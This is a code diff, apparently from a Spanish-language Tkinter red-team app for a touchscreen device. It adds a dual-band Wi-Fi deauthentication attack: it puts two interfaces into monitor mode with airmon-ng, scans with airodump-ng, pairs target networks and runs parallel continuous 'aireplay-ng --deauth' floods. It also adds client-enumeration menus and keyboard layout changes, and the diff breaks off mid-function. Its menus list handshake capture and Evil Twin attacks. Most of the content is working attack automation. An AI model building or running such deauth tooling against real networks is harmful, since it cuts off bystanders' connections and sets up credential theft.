@@ -120,6 +120,7 @@ BASE_DIR_WIFI = "Resultados_Handshake"
 BASE_DIR_EVIL = "Resultados_EvilTwin"
 BASE_DIR_BLE = "Resultados_BLE"
 BASE_DIR_POISON = "Resultados_Poison" 
+BASE_DIR_CLIENTS = "Resultados_Clientes" 
 
 # ==========================================
 # CLASE SCROLLABLE FRAME (Táctil optimizado)
@@ -230,6 +231,86 @@ class ScrollableFrame(tk.Frame):
         widget.pack(**pack_options)
 
 
+class MultiDeauthAttack:
+    """
+    Gestión de dos procesos aireplay-ng en paralelo para desautenticación dual‑band.
+    Recibe:
+      - mon_ifaces: lista de dos interfaces en modo monitor (ej. ['wlan0mon','wlan1mon'])
+      - bssids:     lista con los dos BSSID objetivo
+      - channels:   lista con los canales correspondientes (ya deben estar fijados)
+      - burst:      número de paquetes (0 = infinito)
+      - callback:   función para escribir en la consola gráfica
+    """
+    def __init__(self, mon_ifaces, bssids, channels, burst, callback):
+        self.mon_ifaces = mon_ifaces
+        self.bssids = bssids
+        self.channels = channels
+        self.burst = burst
+        self.callback = callback
+        self.procs = []
+        self.threads = []
+        self._stop_flag = False
+
+    def start(self):
+        self._stop_flag = False
+        for i in range(2):
+            # Construir comando
+            cmd = [
+                "sudo", "aireplay-ng",
+                "--deauth", str(self.burst),
+                "-a", self.bssids[i],
+                self.mon_ifaces[i]
+            ]
+            self.callback(f"[*] Iniciando: {' '.join(cmd)}")
+            
+            # Lanzar proceso
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1
+            )
+            self.procs.append(proc)
+            
+            # Hilo lector de salida
+            t = threading.Thread(target=self._reader, args=(proc, i), daemon=True)
+            t.start()
+            self.threads.append(t)
+
+    def _reader(self, proc, idx):
+        try:
+            for line in iter(proc.stdout.readline, ''):
+                if self._stop_flag:
+                    break
+                if line:
+                    self.callback(f"[if{idx+1}] {line.rstrip()}")
+        except Exception as e:
+            self.callback(f"[!] Error en lector {idx+1}: {e}")
+        finally:
+            proc.stdout.close()
+
+    def stop(self):
+        self._stop_flag = True
+        for proc in self.procs:
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+        # Dar tiempo a terminar y luego kill si es necesario
+        for proc in self.procs:
+            try:
+                proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                try:
+                    proc.kill()
+                except Exception:
+                    pass
+        self.procs.clear()
+        self.threads.clear()
+        self.callback("[+] Ambos procesos de deauth detenidos.")
+
+
 class TecladoNumerico(tk.Toplevel):
     def __init__(self, parent, variable_destino, titulo="Ingresar IP/Rango"):
         super().__init__(parent)
@@ -297,35 +378,59 @@ class TecladoCompleto(tk.Toplevel):
         super().__init__(parent)
         self.variable_destino = variable_destino
         
-        # Configuración como modal Kiosco
         self.title(titulo)
         self.configure(bg=COLOR_FONDO_PRINCIPAL)
         self.attributes('-topmost', True)
         self.overrideredirect(True)
         
-        # Adaptar al tamaño y posición exactos de la ventana padre
         w = parent.winfo_width()
         h = parent.winfo_height()
         x = parent.winfo_x()
         y = parent.winfo_y()
         self.geometry(f"{w}x{h}+{x}+{y}")
 
-        # Contenedor Principal
+        # --- ESCALADO DINÁMICO DE FUENTE Y PADDING ---
+        if w <= 320:
+            self.kb_font = ('Courier', 8, 'bold')
+            self.ent_font = ('Helvetica', 10, 'bold')
+            self.kb_pad = (0, 2)
+        elif w <= 480:
+            self.kb_font = ('Courier', 10, 'bold')
+            self.ent_font = ('Helvetica', 14, 'bold')
+            self.kb_pad = (1, 6)
+        else:
+            self.kb_font = ('Courier', 14, 'bold')
+            self.ent_font = ('Helvetica', 18, 'bold')
+            self.kb_pad = (4, 10)
+
+        # Generar estilos locales para este teclado que no deformen las celdas
+        style = ttk.Style()
+        style.configure('KbGray.TButton', font=self.kb_font, padding=self.kb_pad,
+                        background=COLOR_BOTON_GRIS, foreground=COLOR_TEXTO_PRIMARIO, relief='flat')
+        style.map('KbGray.TButton', background=[('pressed', '#0f0f0f'), ('active', COLOR_BOTON_GRIS_HOVER)],
+                  foreground=[('pressed', '#888888'), ('active', 'white')])
+
+        style.configure('KbRed.TButton', font=self.kb_font, padding=self.kb_pad,
+                        background=COLOR_BOTON_ROJO, foreground='white', relief='flat')
+        style.map('KbRed.TButton', background=[('pressed', '#660005'), ('active', COLOR_BOTON_HOVER)])
+
+        style.configure('KbDanger.TButton', font=self.kb_font, padding=self.kb_pad,
+                        background=COLOR_BOTON_PELIGRO, foreground='#0c0c0c', relief='flat')
+        style.map('KbDanger.TButton', background=[('pressed', '#8a4a00'), ('active', COLOR_BOTON_PELIGRO_HOVER)])
+
         main_frame = ttk.Frame(self, style='Dark.TFrame')
         main_frame.pack(fill='both', expand=True, padx=2, pady=2)
 
-        # Barra superior con título corto y Display
         top_frame = ttk.Frame(main_frame, style='Dark.TFrame')
         top_frame.pack(fill='x', pady=(0, 2))
         
         ttk.Label(top_frame, text=titulo[:15], style='Gray.TLabel').pack(side='left', padx=2)
         
         self.display_var = tk.StringVar(value="")
-        display = ttk.Entry(top_frame, textvariable=self.display_var, font=('Helvetica', 12, 'bold'), 
+        display = ttk.Entry(top_frame, textvariable=self.display_var, font=self.ent_font, 
                             justify='center', style='Dark.TEntry')
         display.pack(side='right', fill='x', expand=True)
 
-        # Contenedor apilado para los teclados (tkraise para no consumir CPU reconstruyendo)
         self.kb_container = ttk.Frame(main_frame, style='Dark.TFrame')
         self.kb_container.pack(fill='both', expand=True)
         self.kb_container.grid_rowconfigure(0, weight=1)
@@ -338,60 +443,68 @@ class TecladoCompleto(tk.Toplevel):
             self.frames_teclado[modo] = frame
             self._construir_teclas(frame, modo)
 
-        # Iniciar en minúsculas
         self.cambiar_modo("minusculas")
 
     def cambiar_modo(self, modo):
         self.frames_teclado[modo].tkraise()
 
     def _construir_teclas(self, parent_frame, modo):
+        # SISTEMA DE GRID UNIFICADO DE 20 COLUMNAS: Permite offset y teclas anchas (ej. barra espaciadora)
+        # Formato: (Texto de Tecla, Span de Columnas)
         if modo == "minusculas":
             filas = [
-                ['q','w','e','r','t','y','u','i','o','p'],
-                ['a','s','d','f','g','h','j','k','l'],
-                ['z','x','c','v','b','n','m','DEL'],
-                ['MAYUS', '123', 'ESPACIO', 'CANCEL', 'OK']
+                [('q',2),('w',2),('e',2),('r',2),('t',2),('y',2),('u',2),('i',2),('o',2),('p',2)],
+                [('pad',1),('a',2),('s',2),('d',2),('f',2),('g',2),('h',2),('j',2),('k',2),('l',2),('pad',1)],
+                [('pad',1),('z',2),('x',2),('c',2),('v',2),('b',2),('n',2),('m',2),('DEL',4),('pad',1)],
+                [('MAYUS',3), ('123',3), ('ESPACIO',8), ('CANCEL',3), ('OK',3)]
             ]
         elif modo == "mayusculas":
             filas = [
-                ['Q','W','E','R','T','Y','U','I','O','P'],
-                ['A','S','D','F','G','H','J','K','L'],
-                ['Z','X','C','V','B','N','M','DEL'],
-                ['minus', '123', 'ESPACIO', 'CANCEL', 'OK']
+                [('Q',2),('W',2),('E',2),('R',2),('T',2),('Y',2),('U',2),('I',2),('O',2),('P',2)],
+                [('pad',1),('A',2),('S',2),('D',2),('F',2),('G',2),('H',2),('J',2),('K',2),('L',2),('pad',1)],
+                [('pad',1),('Z',2),('X',2),('C',2),('V',2),('B',2),('N',2),('M',2),('DEL',4),('pad',1)],
+                [('minus',3), ('123',3), ('ESPACIO',8), ('CANCEL',3), ('OK',3)]
             ]
         else: # simbolos
             filas = [
-                ['1','2','3','4','5','6','7','8','9','0'],
-                ['!','@','#','$','%','&','*','-','_','+'],
-                ['=','/','?','¡','.','"',"'",'DEL'],
-                ['abc', 'MAYUS', 'ESPACIO', 'CANCEL', 'OK']
+                [('1',2),('2',2),('3',2),('4',2),('5',2),('6',2),('7',2),('8',2),('9',2),('0',2)],
+                [('!',2),('@',2),('#',2),('$',2),('%',2),('&',2),('*',2),('-',2),('_',2),('+',2)],
+                [('pad',1),('=',2),('/',2),('?',2),('¡',2),('.',2),('"',2),("'",2),('DEL',4),('pad',1)],
+                [('abc',3), ('MAYUS',3), ('ESPACIO',8), ('CANCEL',3), ('OK',3)]
             ]
 
-        # Configurar las 4 filas para que ocupen todo el alto disponible
-        for i, fila in enumerate(filas):
+        # Configurar 4 filas uniformes
+        for i in range(4):
             parent_frame.grid_rowconfigure(i, weight=1)
-            
-            # Sub-frame para cada fila
-            f = ttk.Frame(parent_frame, style='Dark.TFrame')
-            f.grid(row=i, column=0, sticky='nsew', pady=1)
-            
-            # Repartir el espacio equitativamente entre las teclas de esta fila
-            for j in range(len(fila)):
-                f.grid_columnconfigure(j, weight=1)
-                
-            for j, tecla in enumerate(fila):
-                if tecla in ('OK', 'CANCEL', 'DEL'):
-                    estilo = 'Red.TButton'
-                elif tecla in ('MAYUS', 'minus', '123', 'abc', 'ESPACIO'):
-                    estilo = 'Danger.TButton'
-                else:
-                    estilo = 'Gray.TButton'
+        
+        # Configurar 20 columnas elásticas y uniformes
+        for j in range(20):
+            parent_frame.grid_columnconfigure(j, weight=1)
 
-                # Al usar width=2 forzamos al botón a ignorar su ancho por defecto 
-                # permitiendo que el 'grid' (sticky='nsew') lo estire o encoja matemáticamente
-                btn = ttk.Button(f, text=tecla, style=estilo, width=2,
-                                 command=lambda t=tecla: self._procesar_tecla(t))
-                btn.grid(row=0, column=j, sticky='nsew', padx=1)
+        for i, fila in enumerate(filas):
+            current_col = 0
+            for (tecla, span) in fila:
+                if tecla == 'pad':
+                    # Frame vacío transparente para rellenar los espacios muertos del Offset
+                    frm = ttk.Frame(parent_frame, style='Dark.TFrame')
+                    frm.grid(row=i, column=current_col, columnspan=span, sticky='nsew')
+                else:
+                    if tecla in ('OK', 'CANCEL', 'DEL'):
+                        estilo = 'KbRed.TButton'
+                    elif tecla in ('MAYUS', 'minus', '123', 'abc', 'ESPACIO'):
+                        estilo = 'KbDanger.TButton'
+                    else:
+                        estilo = 'KbGray.TButton'
+
+                    # Modificación estética, para que la barra espaciadora solo sea un bloque visual o el texto limpio
+                    display_text = " " if tecla == 'ESPACIO' else tecla
+
+                    btn = ttk.Button(parent_frame, text=display_text, style=estilo,
+                                     command=lambda t=tecla: self._procesar_tecla(t))
+                    
+                    btn.grid(row=i, column=current_col, columnspan=span, sticky='nsew', padx=1, pady=1)
+
+                current_col += span
 
     def _procesar_tecla(self, tecla):
         actual = self.display_var.get()
@@ -399,7 +512,7 @@ class TecladoCompleto(tk.Toplevel):
             self.variable_destino.set(actual)
             self.destroy()
         elif tecla == 'CANCEL':
-            self.variable_destino.set("CANCELADO") # Flag interno
+            self.variable_destino.set("CANCELADO") # Flag interno de seguridad
             self.destroy()
         elif tecla == 'DEL':
             self.display_var.set(actual[:-1])
@@ -413,6 +526,7 @@ class TecladoCompleto(tk.Toplevel):
             self.cambiar_modo("simbolos")
         else:
             self.display_var.set(actual + tecla)
+
 
 def crear_card(parent, titulo=None, color_borde=None):
     """
@@ -651,7 +765,7 @@ class RedTeamApp(tk.Tk):
         self.gadget_available = False
         self._gadget_initialized = False
 
-        for d in [BASE_DIR_NMAP, BASE_DIR_WIFI, BASE_DIR_EVIL, BASE_DIR_BLE, BASE_DIR_POISON]:
+        for d in [BASE_DIR_NMAP, BASE_DIR_WIFI, BASE_DIR_EVIL, BASE_DIR_BLE, BASE_DIR_POISON, BASE_DIR_CLIENTS]:
             os.makedirs(d, exist_ok=True)
 
         # Configura el fondo de la ventana raíz en oscuro para el margen exterior
@@ -1189,41 +1303,33 @@ class RedTeamApp(tk.Tk):
         scroll_wifi.pack(fill='both', expand=True, padx=2, pady=2)
         
         opciones = [
-            ("Activar Monitor", self._wifi_modo_monitor),
+            ("Clientes Conectados", self._wifi_client_list), 
             ("Captura Handshake", self._wifi_captura_handshake),
             ("Ataque Evil Twin", self._wifi_evil_twin),
-            ("Desautenticación", self._wifi_deauth),
+            ("Ataque Deauth", self._wifi_deauth_menu), 
             ("Explorar Handshakes", self._wifi_explorar_handshakes),
             ("Explorar Evil Twin", self._wifi_explorar_evil),
+            ("Explorar Clientes", self._wifi_explorar_clientes), 
         ]
         for texto, cmd in opciones:
             scroll_wifi.add_button(text=texto, command=cmd, style='Red.TButton', width=28)
             
         self.mostrar_consola(parent=scroll_wifi.scrollable_frame)
 
-    def _wifi_modo_monitor(self):
+
+    def _wifi_deauth_menu(self):
         self.limpiar_main_frame()
         self.agregar_boton_atras(self.show_wifi_menu)
-        ttk.Label(self.main_frame, text="MODO MONITOR", style='Title.TLabel').pack(pady=2)
-        interfaces = self.obtener_interfaces_red()
-        
+        ttk.Label(self.main_frame, text="MENÚ DEAUTH", style='Title.TLabel').pack(pady=2)
+
         scroll = ScrollableFrame(self.main_frame, max_items=10)
         scroll.pack(fill='both', expand=True, padx=2, pady=2)
-        
-        if not interfaces:
-            ttk.Label(scroll.scrollable_frame, text="No hay interfaces.", style='Dark.TLabel').pack()
-            return
-            
-        for iface in interfaces:
-            def comando_iface(i=iface):
-                subprocess.run(["sudo", "airmon-ng", "check", "kill"],
-                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                subprocess.run(["sudo", "airmon-ng", "start", i],
-                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                self.ejecutar_comando(f"sudo airmon-ng start {i}",
-                                     callback_after=lambda: self.escribir_consola("[+] Hecho."))
-            scroll.add_button(text=f"Start {iface}", command=comando_iface, style='Red.TButton', width=28)
-            
+
+        ttk.Label(scroll.scrollable_frame, text="Seleccione modalidad:", style='Gray.TLabel').pack(pady=(0, 4))
+
+        scroll.add_button(text="Single-band (1 Interfaz)", command=self._wifi_deauth, style='Red.TButton', width=28)
+        scroll.add_button(text="Dual-band (2 Interfaces)", command=self._wifi_deauth_multi, style='Danger.TButton', width=28)
+
         self.mostrar_consola(parent=scroll.scrollable_frame)
 
     def _generar_nombre_temporal(self, prefijo):
@@ -1868,7 +1974,7 @@ if __name__ == "__main__":
 
     def _wifi_deauth(self):
         self.limpiar_main_frame()
-        self.agregar_boton_atras(self.show_wifi_menu)
+        self.agregar_boton_atras(self._wifi_deauth_menu)
         ttk.Label(self.main_frame, text="DEAUTH - IFace", style='Title.TLabel').pack(pady=2)
         
         scroll = ScrollableFrame(self.main_frame, max_items=10)
@@ -2082,12 +2188,856 @@ if __name__ == "__main__":
         threading.Thread(target=run_attack, daemon=True).start()
 
 
+    # ==========================================
+    # DEAUTH MÚLTIPLE DUAL‑BAND
+    # ==========================================
+    def _wifi_deauth_multi(self):
+        """Punto de entrada: muestra interfaces disponibles (debe haber al menos 2)."""
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_deauth_menu)
+        ttk.Label(self.main_frame, text="DEAUTH DUAL‑BAND", style='Title.TLabel').pack(pady=2)
+
+        interfaces = self.obtener_interfaces_red()
+        if len(interfaces) < 2:
+            ttk.Label(self.main_frame, text="Se necesitan al menos 2 interfaces físicas.",
+                      style='Dark.TLabel', foreground=COLOR_TEXTO_ADVERTENCIA).pack(pady=10)
+            self.mostrar_consola()
+            self.escribir_consola("[!] No hay suficientes interfaces para ataque dual.")
+            return
+
+        self.wifi_state.setdefault("dual_deauth", {})["selected"] = []
+        self.wifi_state["dual_deauth"]["iface_btns"] = []
+
+        scroll = ScrollableFrame(self.main_frame, max_items=10)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+
+        ttk.Label(scroll.scrollable_frame, text="Seleccione DOS interfaces:", style='Gray.TLabel').pack(pady=(0,4))
+        for iface in interfaces:
+            btn = scroll.add_button(text=iface, style='Red.TButton', width=28,
+                                    command=lambda i=iface: self._deauth_multi_select_iface(i))
+            if btn:
+                self.wifi_state["dual_deauth"]["iface_btns"].append(btn)
+
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+        gc.collect()
+
+    def _deauth_multi_select_iface(self, iface):
+        """Acumula interfaces seleccionadas; al elegir la segunda dispara el escaneo."""
+        state = self.wifi_state["dual_deauth"]
+        selected = state["selected"]
+        if iface in selected:
+            return
+        selected.append(iface)
+
+        # Feedback visual: deshabilitar el botón correspondiente
+        for btn in state["iface_btns"]:
+            if btn.cget("text") == iface:
+                btn.config(style='Gray.TButton')
+                btn.state(['disabled'])
+                break
+
+        if len(selected) == 2:
+            self.escribir_consola(f"[*] Interfaces seleccionadas: {selected[0]}, {selected[1]}")
+            self._deauth_multi_escanear(selected[0], selected[1])
+
+    def _deauth_multi_escanear(self, iface1, iface2):
+        """Pone ambas en monitor y escanea con la primera. Luego muestra redes."""
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_deauth_multi)
+        ttk.Label(self.main_frame, text="ESCANEANDO REDES...", style='Title.TLabel').pack(pady=2)
+        self.mostrar_consola()
+
+        self.wifi_state["dual_deauth"]["iface1"] = iface1
+        self.wifi_state["dual_deauth"]["iface2"] = iface2
+
+        scan_prefix = self._generar_nombre_temporal("dual_scan")
+
+        def preparar_y_escanear():
+            # Poner ambas en modo monitor
+            subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "airmon-ng", "start", iface1], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "airmon-ng", "start", iface2], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            mon1 = f"{iface1}mon" if os.path.exists(f"/sys/class/net/{iface1}mon") else iface1
+            mon2 = f"{iface2}mon" if os.path.exists(f"/sys/class/net/{iface2}mon") else iface2
+            self.wifi_state["dual_deauth"]["mon1"] = mon1
+            self.wifi_state["dual_deauth"]["mon2"] = mon2
+
+            self.after(0, lambda: self.escribir_consola(f"[*] Escaneando con {mon1} (15 s)..."))
+            subprocess.run(f"sudo timeout -k 5 15s airodump-ng {mon1} -w {scan_prefix} --output-format csv",
+                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+            redes = []
+            try:
+                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                    partes = f.read().split("Station MAC,")
+                    for linea in partes[0].split("\n")[2:]:
+                        r = linea.split(",")
+                        if len(r) >= 14 and ":" in r[0]:
+                            redes.append({
+                                "bssid": r[0].strip(),
+                                "ch": r[3].strip(),
+                                "essid": r[13].strip() if r[13].strip() else "<Oculta>"
+                            })
+            except Exception:
+                pass
+            finally:
+                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                    try: os.remove(f"{scan_prefix}{ext}")
+                    except: pass
+
+            self.after(0, lambda: self._deauth_multi_mostrar_redes(redes))
+
+        threading.Thread(target=preparar_y_escanear, daemon=True).start()
+
+    def _deauth_multi_mostrar_redes(self, redes):
+        """Clasifica redes en pares dual‑band y sueltas, y las muestra."""
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_deauth_multi)
+        ttk.Label(self.main_frame, text="SELECCIONA OBJETIVOS", style='Title.TLabel').pack(pady=2)
+
+        if not redes:
+            ttk.Label(self.main_frame, text="No se detectaron redes.", style='Dark.TLabel').pack()
+            return
+
+        # --- Clasificación ---
+        # Agrupar por ESSID (ignorando mayúsculas/minúsculas)
+        groups = {}
+        for r in redes:
+            key = r['essid'].lower()
+            groups.setdefault(key, []).append(r)
+
+        dual_pairs = []   # lista de tuplas (red1, red2)
+        singles = []
+        used = set()
+        for essid_lower, items in groups.items():
+            if len(items) >= 2:
+                # Buscar todas las combinaciones de canales distintos
+                for i in range(len(items)):
+                    for j in range(i+1, len(items)):
+                        if items[i]['ch'] != items[j]['ch']:
+                            dual_pairs.append((items[i], items[j]))
+                            used.add(items[i]['bssid'])
+                            used.add(items[j]['bssid'])
+            # Las redes que no se usaron en ningún par pasan a singles
+            for item in items:
+                if item['bssid'] not in used:
+                    singles.append(item)
+
+        # También incluir en singles las que no fueron emparejadas
+        # pero ya las hemos añadido en el bucle.
+
+        scroll = ScrollableFrame(self.main_frame, max_items=80)
+        scroll.pack(fill='both', expand=True, padx=5, pady=2)
+
+        # Sección "Redes dual‑band detectadas"
+        if dual_pairs:
+            ttk.Label(scroll.scrollable_frame, text="── Redes dual‑band detectadas ──",
+                      style='Mono.TLabel', foreground=COLOR_TEXTO_EXITO).pack(anchor='w', padx=5, pady=(5,2))
+            for red1, red2 in dual_pairs:
+                texto = f"{red1['essid']}  (CH{red1['ch']} + CH{red2['ch']})"
+                btn = ttk.Button(scroll.scrollable_frame, text=texto, style='Gray.TButton',
+                                 command=lambda r1=red1, r2=red2: self._deauth_multi_configurar_ataque(r1, r2))
+                btn.pack(fill='x', padx=10, pady=3)
+
+        # Sección "Otras redes disponibles"
+        if singles:
+            ttk.Label(scroll.scrollable_frame, text="── Otras redes disponibles ──",
+                      style='Mono.TLabel', foreground=COLOR_TEXTO_SECUNDARIO).pack(anchor='w', padx=5, pady=(8,2))
+            for red in singles:
+                texto = f"{red['essid']}  (CH{red['ch']})"
+                btn = ttk.Button(scroll.scrollable_frame, text=texto, style='Gray.TButton',
+                                 command=lambda r=red: self._deauth_multi_add_manual(r))
+                btn.pack(fill='x', padx=10, pady=2)
+
+        # Lista de selección manual (se muestran las dos seleccionadas si ya hay)
+        self.wifi_state["dual_deauth"]["manual_selection"] = []
+        self.wifi_state["dual_deauth"]["manual_btns"] = []
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+        gc.collect()
+
+    def _deauth_multi_add_manual(self, red):
+        """Permite seleccionar redes manualmente una a una (hasta dos)."""
+        state = self.wifi_state["dual_deauth"]
+        manual = state.setdefault("manual_selection", [])
+        if len(manual) >= 2:
+            return  # ya hay dos
+        if any(r['bssid'] == red['bssid'] for r in manual):
+            return  # ya está seleccionada
+
+        manual.append(red)
+        self.escribir_consola(f"[*] Seleccionada manualmente: {red['essid']} (CH{red['ch']})")
+
+        # Si ya hay dos, pasar directamente a configuración
+        if len(manual) == 2:
+            self._deauth_multi_configurar_ataque(manual[0], manual[1])
+
+    def _deauth_multi_configurar_ataque(self, red1, red2):
+        """
+        Muestra resumen, ajusta canales y permite elegir ráfaga.
+        red1 se asigna a la primera interfaz, red2 a la segunda.
+        """
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_deauth_multi)
+        ttk.Label(self.main_frame, text="CONFIGURAR ATAQUE DUAL", style='Title.TLabel').pack(pady=2)
+
+        mon1 = self.wifi_state["dual_deauth"]["mon1"]
+        mon2 = self.wifi_state["dual_deauth"]["mon2"]
+        iface1 = self.wifi_state["dual_deauth"]["iface1"]
+        iface2 = self.wifi_state["dual_deauth"]["iface2"]
+
+        # Guardar objetivos
+        self.wifi_state["dual_deauth"]["target1"] = red1
+        self.wifi_state["dual_deauth"]["target2"] = red2
+
+        # Mostrar resumen
+        resumen = (f"Ataque dual:\n"
+                   f"{red1['essid']} (CH {red1['ch']}) ← {iface1}\n"
+                   f"{red2['essid']} (CH {red2['ch']}) ← {iface2}")
+        ttk.Label(self.main_frame, text=resumen, style='Mono.TLabel',
+                  justify='center').pack(pady=10)
+
+        # Ajustar canales
+        self.escribir_consola(f"[*] Fijando canal {red1['ch']} en {mon1}")
+        subprocess.run(["sudo", "iw", "dev", mon1, "set", "channel", red1['ch']],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self.escribir_consola(f"[*] Fijando canal {red2['ch']} en {mon2}")
+        subprocess.run(["sudo", "iw", "dev", mon2, "set", "channel", red2['ch']],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        # Selección de ráfaga (común para ambas)
+        ttk.Label(self.main_frame, text="Paquetes por ráfaga:", style='Gray.TLabel').pack(pady=(10,2))
+        burst_var = tk.StringVar(value="0")
+        burst_menu = ttk.OptionMenu(self.main_frame, burst_var, "0",
+                                    "Continuo (0)", "5", "15", style='Dark.TMenubutton')
+        burst_menu.pack()
+
+        # Botón de inicio
+        def iniciar():
+            burst_str = burst_var.get()
+            if burst_str == "Continuo (0)":
+                burst = "0"
+            else:
+                burst = burst_str
+            self._deauth_multi_iniciar_ataque(red1, red2, burst)
+
+        ttk.Button(self.main_frame, text="INICIAR ATAQUE DUAL", style='Red.TButton',
+                   command=iniciar).pack(pady=15, fill='x', padx=30)
+
+        self.mostrar_consola()
+        gc.collect()
+
+    def _deauth_multi_iniciar_ataque(self, red1, red2, burst):
+        """Crea la instancia MultiDeauthAttack y lanza los procesos."""
+        mon1 = self.wifi_state["dual_deauth"]["mon1"]
+        mon2 = self.wifi_state["dual_deauth"]["mon2"]
+
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_wifi_menu)  # no se puede volver atrás mientras ataca, pero dejamos menú
+        ttk.Label(self.main_frame, text="ATAQUE DUAL EN CURSO", style='Title.TLabel').pack(pady=5)
+
+        scroll = ScrollableFrame(self.main_frame, max_items=5)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+
+        # Botón de detención
+        self.btn_detener_dual = scroll.add_button(
+            text="DETENER DEAUTH DUAL",
+            command=self._deauth_multi_detener,
+            style='Danger.TButton',
+            width=28
+        )
+
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+
+        self.multi_deauth_instance = MultiDeauthAttack(
+            mon_ifaces=[mon1, mon2],
+            bssids=[red1['bssid'], red2['bssid']],
+            channels=[red1['ch'], red2['ch']],
+            burst=burst,
+            callback=self.escribir_consola
+        )
+
+        self.multi_deauth_instance.start()
+
+    def _deauth_multi_detener(self):
+        """Detiene el ataque dual y restaura la UI."""
+        if hasattr(self, 'btn_detener_dual') and self.btn_detener_dual.winfo_exists():
+            self.btn_detener_dual.config(style='Gray.TButton')
+            self.btn_detener_dual.state(['disabled'])
+
+        if hasattr(self, 'multi_deauth_instance') and self.multi_deauth_instance:
+            self.multi_deauth_instance.stop()
+            self.multi_deauth_instance = None
+
+        self.escribir_consola("[*] Ataque dual detenido. Puede volver al menú.")
+
+
+    # ==========================================
+    # ENUMERACIÓN DE CLIENTES PASIVA
+    # ==========================================
+    def _wifi_client_list(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_wifi_menu)
+        ttk.Label(self.main_frame, text="ENUMERAR CLIENTES", style='Title.TLabel').pack(pady=2)
+
+        interfaces = self.obtener_interfaces_wifi()
+        if not interfaces:
+            ttk.Label(self.main_frame, text="No hay interfaces WiFi.", style='Dark.TLabel').pack(pady=10)
+            self.mostrar_consola()
+            return
+
+        if len(interfaces) < 2:
+            self._wifi_client_single_select_iface(from_direct=True)  # <-- nuevo argumento
+        else:
+            scroll = ScrollableFrame(self.main_frame, max_items=10)
+            scroll.pack(fill='both', expand=True, padx=2, pady=2)
+            ttk.Label(scroll.scrollable_frame, text="Seleccione modalidad:", style='Gray.TLabel').pack(pady=(0, 4))
+
+            scroll.add_button(text="Single-band (1 Interfaz)", command=self._wifi_client_single_select_iface, style='Red.TButton', width=28)
+            scroll.add_button(text="Dual-band (2 Interfaces)", command=self._wifi_client_dual_select_ifaces, style='Danger.TButton', width=28)
+
+            self.mostrar_consola(parent=scroll.scrollable_frame)
+
+    def _wifi_client_single_select_iface(self, from_direct=False):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_wifi_menu if from_direct else self._wifi_client_list)
+        ttk.Label(self.main_frame, text="SINGLE-BAND: IFACE", style='Title.TLabel').pack(pady=2)
+
+        scroll = ScrollableFrame(self.main_frame, max_items=10)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+
+        self.client_iface_btns = []
+        for iface in self.obtener_interfaces_wifi():
+            btn = scroll.add_button(
+                text=iface, 
+                command=lambda i=iface: self._wifi_client_scan(i, mode='single'), 
+                style='Red.TButton', width=28
+            )
+            if btn: self.client_iface_btns.append(btn)
+
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+
+    def _wifi_client_dual_select_ifaces(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_client_list)
+        ttk.Label(self.main_frame, text="DUAL-BAND: IFACES", style='Title.TLabel').pack(pady=2)
+
+        scroll = ScrollableFrame(self.main_frame, max_items=10)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+
+        ttk.Label(scroll.scrollable_frame, text="Seleccione 2 interfaces:", style='Gray.TLabel').pack(pady=(0, 4))
+
+        self.wifi_state.setdefault("dual_client", {})["selected"] = []
+        self.wifi_state["dual_client"]["btns"] = []
+
+        for iface in self.obtener_interfaces_wifi():
+            btn = scroll.add_button(
+                text=iface, 
+                command=lambda i=iface: self._wifi_client_dual_add(i), 
+                style='Red.TButton', width=28
+            )
+            if btn: self.wifi_state["dual_client"]["btns"].append(btn)
+
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+
+    def _wifi_client_dual_add(self, iface):
+        state = self.wifi_state["dual_client"]
+        selected = state["selected"]
+        if iface in selected: return
+        selected.append(iface)
+
+        for btn in state["btns"]:
+            if btn.cget("text") == iface:
+                btn.config(style='Gray.TButton')
+                btn.state(['disabled'])
+                break
+
+        if len(selected) == 2:
+            self.escribir_consola(f"[*] Interfaces seleccionadas: {selected[0]}, {selected[1]}")
+            self._wifi_client_scan(selected[0], iface_5g=selected[1], mode='dual')
+
+    def _wifi_client_scan(self, iface, iface_5g=None, mode='single'):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_client_list)
+        ttk.Label(self.main_frame, text="ESCANEANDO REDES...", style='Title.TLabel').pack(pady=2)
+        self.mostrar_consola()
+
+        self.wifi_state["client_scan_mode"] = mode
+        self.wifi_state["iface_2g"] = iface
+        self.wifi_state["iface_5g"] = iface_5g
+
+        scan_prefix_2g = self._generar_nombre_temporal("client_scan_2g")
+        scan_prefix_5g = self._generar_nombre_temporal("client_scan_5g") if mode == 'dual' else None
+
+        def escanear():
